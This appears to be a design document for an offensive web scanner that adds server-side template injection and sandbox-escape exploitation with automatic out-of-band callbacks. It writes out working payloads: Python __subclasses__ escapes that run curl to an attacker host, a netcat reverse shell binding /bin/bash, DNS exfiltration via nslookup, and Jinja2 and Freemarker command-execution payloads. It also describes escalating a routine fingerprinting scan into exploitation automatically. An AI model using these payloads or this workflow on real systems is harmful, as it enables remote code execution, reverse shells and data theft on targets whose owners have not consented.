# Sandbox-Agnostic SSTI/RCE with Multi-Channel OOB Integration

## Overview

The HTTP fingerprinting scan now includes sandbox-agnostic SSTI/RCE detection with automatic multi-channel Out-of-Band (OOB) testing when sandboxed environments are detected.

## Integration Flow

### 1. Normal Fingerprinting
- Headers analysis
- WAF detection  
- JavaScript analysis
- Technology detection

### 2. Sandbox Detection
The `detect_execution_account()` method now:
- Tests for Python sandbox environments using basic expressions
- Enumerates dangerous classes (`subprocess.Popen`, `os._wrap_close`, etc.)
- Detects SSTI template engines
- Identifies output suppression

### 3. Automatic OOB Launch
When sandbox/output suppression is detected:
```python
if account.get('output_suppressed') or account.get('sandbox_type') == 'python':
    # Automatically launch multi-channel OOB testing
    oob_results = multi_channel_oob_test(
        target_url=target_url,
        attacker_ip=attacker_ip,
        dns_domain="yourtoken.interact.sh",
        dangerous_classes=dangerous_classes
    )
```

## Multi-Channel OOB Testing

### HTTP Callbacks
- Tests multiple ports: 8080, 8000, 9000, 4444, 8888
- Generic payloads: `curl`, `wget`, `python urllib`, `powershell`
- Python sandbox escapes: `().__class__.__base__.__subclasses__()[INDEX](['curl', 'http://callback'])`

### Netcat Callbacks  
- Tests ports: 4444, 4445, 9999, 1337, 8888
- Reverse shell payloads for Linux/Windows
- Python sandbox netcat escapes

### DNS Callbacks
- Uses DNS exfiltration domains (interact.sh, etc.)
- Payloads: `nslookup`, `dig`, `host`, `ping`
- Python sandbox DNS escapes

## Payload Format

### Generic Sandbox Escapes (Python)
```python
# HTTP callback
().__class__.__base__.__subclasses__()[59](['curl', 'http://attacker-ip:8080/callback'])

# Netcat reverse shell  
().__class__.__base__.__subclasses__()[59](['nc', 'attacker-ip', '4444', '-e', '/bin/bash'])

# DNS exfiltration
().__class__.__base__.__subclasses__()[59](['nslookup', 'data.interact.sh'])
```

### SSTI Template Engines
```python
# Jinja2/Flask
{{ config.__class__.__init__.__globals__['os'].system('curl http://callback') }}

# Freemarker
${"freemarker.template.utility.Execute"?new()("curl http://callback")}
```

## Files Modified

### 1. `app/tools/oob_tester.py` (NEW)
- `MultiChannelOOBTester` class
- Async HTTP/Netcat/DNS payload delivery
- Python sandbox escape integration
- `multi_channel_oob_test()` sync wrapper

### 2. `app/tools/http_fingerprint.py` (MODIFIED)
- Added OOB tester import
- Modified `test_ssti_account_detection()` to launch OOB when sandbox detected
- Added `_get_attacker_ip()` and `_detect_external_ip()` helpers
- Enhanced sandbox detection with automatic OOB triggering

### 3. `app/tools/http_scanner.py` (MODIFIED)  
- Updated output messages for OOB testing
- Enhanced sandbox detection reporting
- Shows multi-channel OOB status

## Usage

### Automatic Mode (Recommended)
1. Run HTTP "Fingerprinting" scan
2. System automatically detects sandboxes
3. Multi-channel OOB testing launches automatically
4. Monitor listeners for callbacks

### Manual Testing
```python
from app.tools.oob_tester import multi_channel_oob_test

results = multi_channel_oob_test(
    target_url="https://target.com/eval",
    attacker_ip="your-ip",
    dns_domain="token.interact.sh",
    dangerous_classes=[(59, 'subprocess.Popen')]
)
```

## Listener Setup

### HTTP Listener
```python
listener_id = listener_manager.create_listener(8080, 'http', '0.0.0.0')
listener_manager.start_listener(listener_id)
```

### Netcat Listener
```bash
nc -lvnp 4444
```

### DNS Monitoring
- Use Burp Collaborator
- Use interact.sh
- Set up custom DNS server

## Detection Logic

### Python Sandbox Detection
1. Test basic expressions: `1+1`, `len('abc')`, `str(42)`
2. If successful, enumerate `().__class__.__base__.__subclasses__()`
3. Find dangerous classes: `Popen`, `os._wrap_close`, `HTTPConnection`
4. Test command execution with `whoami`
5. If output suppressed → Launch OOB

### SSTI Detection  
1. Test template expressions: `{{1+1}}`, `${1+1}`, `<%= 1+1 %>`
2. If successful, try bypass payloads
3. Test for output suppression
4. If suppressed → Launch OOB

## Benefits

1. **Sandbox Agnostic**: Works across Python, template engines, and generic RCE
2. **Automatic**: No manual OOB setup required
3. **Multi-Channel**: Increases callback success rate
4. **Targeted**: Uses discovered dangerous classes for precise exploitation
5. **Integrated**: Seamless part of normal fingerprinting workflow

## Testing

Run the integration test:
```bash
python test_oob_integration.py
```

This will verify:
- Listener creation/management
- Attacker IP detection  
- Multi-channel OOB payload delivery
- Integration with HTTP fingerprinting